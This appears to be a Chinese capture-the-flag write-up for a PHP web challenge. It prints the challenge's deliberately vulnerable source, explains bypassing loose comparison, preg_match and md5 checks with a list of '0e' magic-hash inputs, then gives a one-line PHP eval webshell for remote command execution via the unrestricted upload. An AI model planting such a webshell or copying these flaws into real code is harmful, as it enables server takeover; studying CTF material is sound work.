提示：或许你能找到我不小心传上去的源代码~

可以用dirsearch扫也可以猜一猜www.zip

拿到源码

```php
<?php
header('Content-Type: text/html; charset=UTF-8');
$flag1='r00t2024{y0ur_php_i5_s0_good}';
if(isset($_GET['b'])){
    $a=0;
    $b=$_GET['b'];
    if(!intval($b)&&$a==$b){
        echo "你学会php的弱类型比较啦<br>";
        if(isset($_GET['num'])&&!preg_match("/[0-9]/", $_GET['num'])&&intval($_GET['num'])){
            echo "哇塞！怎么绕过preg_match你也会！！<br>";
            if(isset($_GET['ans1'])&&isset($_GET['ans2'])&&$_GET['ans1']!=$_GET['ans2']&&md5($_GET['ans1'])==md5($_GET['ans2'])){
                echo "好厉害！！！<br>";
                echo $flag1;
                echo "<br>";
                $file = $_FILES['file'];
                if ($file['size'] > 1048576) {
                    die('File size is too large. Maximum allowed size is 1MB.');
                }
                if (!isset($file)){
                    die('upload error');
                }
                $result = move_uploaded_file($file['tmp_name'], $file['name']);
                echo "uploade seccess!";
                
            }
            else{
                die("最后一步啦！什么是MD5碰撞啊");
            }
        }
        else{
            die("oh no!不可以包含0~9的数字！");
        }
    }
    else{
        die('不能相等！要相等！');
    }

}
else{

    die("或许你能找到我不小心传上去的源代码~");
    
}
?>
```

+ php弱类型比较：当字符串与数字比较时会将字符串前面的数字拿出来与数字比较，那么让b=abc（任意字母开头即可）

+ preg_match在接收到数组时会返回false，那么num[]=123就可以了

+ md5碰撞，php会将"0e1234"类似的字符串视为0（科学计数法），所以构造两个md5加密后为该格式即可，可以直接搜索md5碰撞

  >  MMHUWUV 0e701732711630150438129209816536
  >
  > MAUXXQC 0e478478466848439040434801845361
  >
  > IHKFRNS 0e256160682445802696926137988570
  >
  > GZECLQZ 0e537612333747236407713628225676
  >
  > GGHMVOE 0e362766013028313274586933780773
  >
  > GEGHBXL 0e248776895502908863709684713578
  >
  > EEIZDOI 0e782601363539291779881938479162
  >
  > DYAXWCA 0e424759758842488633464374063001

  


然后就可以文件上传了

php一句话木马：`<?php eval($_GET['cmd'])?>`这段代码可以执行你给cmd传入的命令，发现放在了同一目录，可以直接file_get_contents，也可以用system（）函数rce，还可以直接打印环境变量中的flag